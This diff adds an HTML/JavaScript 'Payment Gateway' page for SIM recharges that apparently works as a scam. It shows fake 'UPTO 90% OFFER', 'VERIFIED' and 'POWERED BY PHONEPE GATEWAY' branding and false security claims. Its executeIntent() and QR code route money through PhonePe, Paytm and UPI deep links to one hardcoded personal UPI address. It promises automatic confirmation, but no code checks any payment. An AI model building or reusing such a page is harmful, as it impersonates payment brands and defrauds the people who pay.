@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Payment Gateway</title>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J8CJT7PL1X"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-J8CJT7PL1X');</script>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  *,*::before,*::after{box-sizing:border-box}
+  html,body{width:100%;min-height:100%;overflow-x:hidden}
+  body{margin:0;background:linear-gradient(180deg,#ece7f6 0%,#eef0f4 40%);font-family:'Manrope',-apple-system,sans-serif;min-height:100vh;min-height:100dvh;display:flex;justify-content:center;align-items:flex-start;padding:24px 16px}
+  .card{width:100%;max-width:420px;min-height:100vh;min-height:100dvh;background:#fff;border-radius:28px;overflow:hidden;box-shadow:0 24px 60px -20px rgba(95,37,159,.28),0 2px 8px rgba(16,24,40,.04);border:1px solid rgba(95,37,159,.06)}
+  .card > :first-child{padding-top:calc(16px + env(safe-area-inset-top)) !important}
+  .card > :last-child{padding-bottom:calc(26px + env(safe-area-inset-bottom)) !important}
+  button,input{font:inherit;touch-action:manipulation}
+  button{min-height:44px}
+  input{font-size:16px !important}
+  .btn-primary{background:linear-gradient(120deg,#5f259f,#7b34c9);box-shadow:0 12px 22px -12px rgba(95,37,159,.7)}
+  a{color:#5f259f;text-decoration:none}a:hover{color:#4a1c7d}
+  @keyframes qrspin{to{transform:rotate(360deg)}}
+  @keyframes qrpulse{0%,100%{opacity:.5}50%{opacity:1}}
+  #methods{min-width:0;max-width:100%;overflow-x:hidden}
+  #qrbox{max-width:100%;overflow:hidden}
+  #qrbox img,#qrbox canvas{display:block;width:min(210px,calc(100vw - 96px)) !important;height:auto !important;aspect-ratio:1/1;border-radius:6px}
+  @media (max-width:640px){
+    body{padding:0;background:#fff}
+    .card{max-width:100%;min-height:100vh;min-height:100dvh;border-radius:0;border:0;box-shadow:none}
+  }
+</style>
+</head>
+<body>
+  <div class="card" id="root">
+    <!-- Header -->
+    <div style="display:flex;align-items:center;gap:14px;padding:16px 18px;background:#efeaf7">
+      <button onclick="location.href='plans.html'" style="display:grid;place-items:center;width:36px;height:36px;border:none;border-radius:11px;background:#fff;color:#5f259f;font-size:17px;cursor:pointer;box-shadow:0 2px 8px -4px rgba(95,37,159,.4)"><i class="fa-solid fa-arrow-left"></i></button>
+      <span style="flex:1;font-size:19px;font-weight:800;color:#1b1230">Payment Gateway</span>
+      <span style="display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:20px;background:#fff;color:#5f259f;font-size:13px;font-weight:800;box-shadow:0 2px 8px -4px rgba(95,37,159,.4)"><i class="fa-regular fa-clock"></i><span id="timer">05:00</span></span>
+    </div>
+
+    <div style="padding:16px 18px 26px">
+      <!-- Payable amount -->
+      <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;padding:18px;border-radius:20px;background:linear-gradient(120deg,#5f259f 0%,#7b34c9 100%);box-shadow:0 16px 30px -16px rgba(95,37,159,.7)">
+        <div>
+          <div style="font-size:10.5px;font-weight:700;letter-spacing:.8px;color:rgba(255,255,255,.75)">PAYABLE AMOUNT</div>
+          <div style="margin-top:4px;font-size:34px;font-weight:800;color:#fff;line-height:1">₹<span id="amount">399</span></div>
+        </div>
+        <div style="text-align:right">
+          <span style="display:inline-block;font-size:9.5px;font-weight:800;letter-spacing:.4px;color:#5f259f;background:#fff;padding:4px 10px;border-radius:20px">SPECIAL ACTIVE OFFER</span>
+          <div style="margin-top:10px;display:flex;align-items:center;justify-content:flex-end;gap:10px">
+            <span id="phone" style="font-size:13px;font-weight:700;color:#fff">+91 6567876543</span>
+            <span id="opAvatar" style="display:grid;place-items:center;width:40px;height:40px;border-radius:50%;background:#e21b22;color:#fff;font-size:13px;font-weight:800;border:2px solid rgba(255,255,255,.4)">Jio</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Offer strip -->
+      <div style="display:flex;align-items:center;gap:8px;margin-top:14px;padding:13px 16px;border-radius:14px;background:#eee9f5">
+        <span style="width:7px;height:7px;border-radius:50%;background:#5f259f"></span>
+        <span style="flex:1;font-size:13px;font-weight:800;letter-spacing:.4px;color:#5f259f">UPTO 90% OFFER IS LIVE</span>
+        <span style="display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:800;color:#fff;background:#5f259f;padding:5px 11px;border-radius:8px"><i class="fa-solid fa-check"></i>VERIFIED</span>
+      </div>
+
+      <!-- UPI -->
+      <div style="margin-top:22px"><div style="font-size:17px;font-weight:800;color:#1b1230">UPI</div><div style="margin-top:2px;font-size:12.5px;color:#8b849c">Pay by any UPI app</div></div>
+
+      <div id="methods" style="margin-top:14px;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 10px 26px -18px rgba(16,24,40,.5);border:1px solid #efedf3"></div>
+
+      <!-- Footer -->
+      <div style="margin-top:40px;text-align:center">
+        <div style="display:inline-flex;align-items:center;gap:7px;font-size:12.5px;font-weight:600;color:#2e9e6b"><i class="fa-solid fa-shield-halved"></i>100% Secure 256-bit Encrypted Connection</div>
+        <div style="margin-top:12px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:11px;font-weight:700;letter-spacing:1px;color:#9a93ab">POWERED BY
+          <span style="display:inline-flex;align-items:center;gap:5px;color:#fff;background:#5f259f;padding:4px 10px;border-radius:20px"><i class="fa-solid fa-bolt"></i>PHONEPE GATEWAY</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+/* ---- amount / phone / operator from localStorage (remap keys) ---- */
+var amount = localStorage.getItem('recharge_amount') || '399';
+document.getElementById('amount').textContent = amount;
+var num = localStorage.getItem('recharge_mobile') || '6567876543';
+if(num.length===10) document.getElementById('phone').textContent = '+91 '+num.slice(0,5)+' '+num.slice(5);
+var OPCOL = { Jio:['#e21b22','#fff'], Airtel:['#fff','#e40000'], Vi:['#e60000','#fff'], BSNL:['#fff','#1a6bb0'] };
+var op = localStorage.getItem('recharge_operator') || 'Jio';
+(function(){ var a=document.getElementById('opAvatar'), c=OPCOL[op]||OPCOL.Jio; a.textContent=op; a.style.background=c[0]; a.style.color=c[1]; a.style.fontSize=(op.length>3?'10px':'13px'); })();
+
+/* ---- UPI methods ---- */
+var METHODS = [
+  { id:'phonepe', name:'PhonePe', icon:'<img src="phonepe.webp" alt="PhonePe" style="width:38px;height:38px;border-radius:50%;object-fit:cover;flex-shrink:0;">' },
+  { id:'paytm',   name:'Paytm',   icon:'<img src="paytm.png" alt="Paytm" style="width:38px;height:38px;border-radius:50%;object-fit:contain;background:#fff;flex-shrink:0;">' },
+  { id:'qr',      name:'Pay via QR Code', icon:'<span style="display:grid;place-items:center;width:38px;height:38px;border-radius:50%;background:#5f259f;color:#fff"><i class="fa-solid fa-qrcode"></i></span>' },
+  { id:'other',   name:'Pay via Other UPI', icon:'<img src="upi.webp" alt="UPI" style="width:38px;height:38px;border-radius:50%;object-fit:contain;flex-shrink:0;">' }
+];
+var selected = 'phonepe';
+var selectedApp = 'phonepe';
+var upiAddress = 'paytm.s1lb3d6@pty';
+var merchantName = 'SIM Recharge';
+var trId = '';
+for(var i=0;i<13;i++) trId += Math.floor(Math.random()*10).toString();
+
+function dot(active){ return '<span style="width:20px;height:20px;border-radius:50%;border:2px solid '+(active?'#5f259f':'#d5d1e0')+';background:'+(active?'radial-gradient(circle,#5f259f 42%,#fff 43%)':'#fff')+';flex-shrink:0"></span>'; }
+
+function renderMethods(){
+  var host=document.getElementById('methods');
+  host.innerHTML = METHODS.map(function(m,i){
+    var active = m.id===selected;
+    var row = '<button onclick="selectUpiOption(\''+m.id+'\')" style="width:100%;display:flex;align-items:center;gap:13px;padding:15px 16px;border:none;background:transparent;font-family:inherit;cursor:pointer;border-top:'+(i===0?'none':'1px solid #f0eef4')+'">'+m.icon+'<span style="flex:1;text-align:left;font-size:15px;font-weight:700;color:#1b1230">'+m.name+'</span>'+dot(active)+'</button>';
+    var extra='';
+    if(active && m.id==='qr'){
+      extra = '<div style="margin:0 12px 14px;padding:20px 16px;border-radius:16px;background:linear-gradient(180deg,#f6f2fd,#f2edfb);border:1px solid rgba(95,37,159,.1);text-align:center">'
+        + '<div style="font-size:12px;font-weight:800;letter-spacing:.6px;color:#5f259f">SCAN THIS QR TO MAKE PAYMENT</div>'
+        + '<div style="margin-top:4px;font-size:12px;font-weight:700;color:#e0417a">Expires in <span id="qrtimer">'+fmt(seconds)+'</span></div>'
+        + '<div style="display:inline-block;margin-top:14px;padding:14px;background:#fff;border-radius:18px;box-shadow:0 12px 26px -14px rgba(95,37,159,.5)"><div id="qrbox"></div></div>'
+        + '<div style="margin-top:14px;display:flex;align-items:center;justify-content:center;gap:7px;flex-wrap:wrap;font-size:12.5px;font-weight:700;color:#6b6480">Scan &amp; pay with <img src="phonepe.webp" alt="PhonePe" style="width:22px;height:22px;border-radius:50%;object-fit:contain;"><img src="paytm.png" alt="Paytm" style="width:22px;height:22px;border-radius:50%;object-fit:contain;background:#fff;"><img src="upi.webp" alt="UPI" style="width:22px;height:22px;border-radius:50%;object-fit:contain;"> any UPI app</div>'
+        + '<button class="btn-primary" onclick="executeIntent(\'qr\')" style="width:100%;margin-top:16px;border:none;border-radius:13px;padding:15px 0;font-family:inherit;font-weight:800;font-size:15px;color:#fff;cursor:pointer">Verify Payment</button>'
+        + '<div style="margin-top:16px;display:flex;align-items:center;justify-content:center;gap:9px"><span style="width:16px;height:16px;border:2px solid #d9cdec;border-top-color:#5f259f;border-radius:50%;animation:qrspin .8s linear infinite;display:inline-block"></span><span style="font-size:12.5px;font-weight:700;color:#5f259f;animation:qrpulse 1.6s ease-in-out infinite">Waiting for payment\u2026 we\u2019ll confirm automatically</span></div>'
+        + '</div>';
+    } else if(active){
+      extra = '<div style="padding:0 16px 16px"><button class="btn-primary" onclick="executeIntent(\''+m.id+'\')" style="width:100%;border:none;border-radius:13px;padding:15px 0;font-family:inherit;font-weight:800;font-size:15px;color:#fff;cursor:pointer">Pay via '+m.name+'</button></div>';
+    }
+    return '<div>'+row+extra+'</div>';
+  }).join('');
+  if(selected==='qr') drawQR();
+}
+
+/* ---- KEEP your existing selectUpiOption() — this is a UI-only wrapper ---- */
+function selectUpiOption(id){
+  selected = id;
+  selectedApp = id === 'other' ? 'all' : id;
+  if(id==='qr'){ seconds=300; startTimer(); } else { stopTimer(); }
+  renderMethods();
+}
+
+/* ---- KEEP your existing executeIntent() ---- */
+function executeIntent(method){
+  var app = method || selectedApp;
+  if(!app) return;
+  var initialAmountInPaise = Math.round(Number(amount) * 100);
+  var noteMsg = 'RC' + new Date().toISOString().replace(/[-:T.Z]/g, '').slice(0,14);
+  if(app === 'phonepe'){
+    var p2pPayload = {p2pPaymentCheckoutParams:{checkoutType:'COLLECT',initialAmount:initialAmountInPaise,note:{type:'text',message:noteMsg},supportedInstruments:-1},contact:{type:'EXTERNAL_MERCHANT',name:merchantName,vpa:upiAddress}};
+    var base64Data = btoa(JSON.stringify(p2pPayload));
+    window.location.href = 'phonepe://native?data=' + base64Data + '&id=p2ppayment';
+  } else if(app === 'paytm'){
+    window.location.href = 'paytmmp://cash_wallet?pa=' + upiAddress + '&am=' + Number(amount).toFixed(2) + '&pn=' + encodeURIComponent(merchantName) + '&cu=INR';
+  } else {
+    window.location.href = 'upi://pay?pa=' + encodeURIComponent(upiAddress) + '&pn=' + encodeURIComponent(merchantName) + '&am=' + Number(amount).toFixed(2) + '&cu=INR&mode=02&tr=' + encodeURIComponent(trId);
+  }
+}
+
+/* QR generation (QRCode.js) */
+function drawQR(){
+  var box=document.getElementById('qrbox'); if(!box || !window.QRCode) return;
+  box.innerHTML='';
+  new QRCode(box,{ text:'upi://pay?pa='+encodeURIComponent(upiAddress)+'&pn='+encodeURIComponent(merchantName)+'&am='+Number(amount).toFixed(2)+'&cu=INR&mode=02&tr='+trId, width:210, height:210, colorDark:'#5f259f', colorLight:'#ffffff', correctLevel:QRCode.CorrectLevel.H });
+}
+
+/* timer only while QR selected */
+var seconds=300, tId=null;
+function fmt(s){ return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0'); }
+function startTimer(){ stopTimer(); document.getElementById('timer').textContent=fmt(seconds); tId=setInterval(function(){ if(seconds>0)seconds--; document.getElementById('timer').textContent=fmt(seconds); var q=document.getElementById('qrtimer'); if(q)q.textContent=fmt(seconds); },1000); }
+function stopTimer(){ if(tId){clearInterval(tId);tId=null;} }
+
+renderMethods();
+</script>
+</body>
+</html>
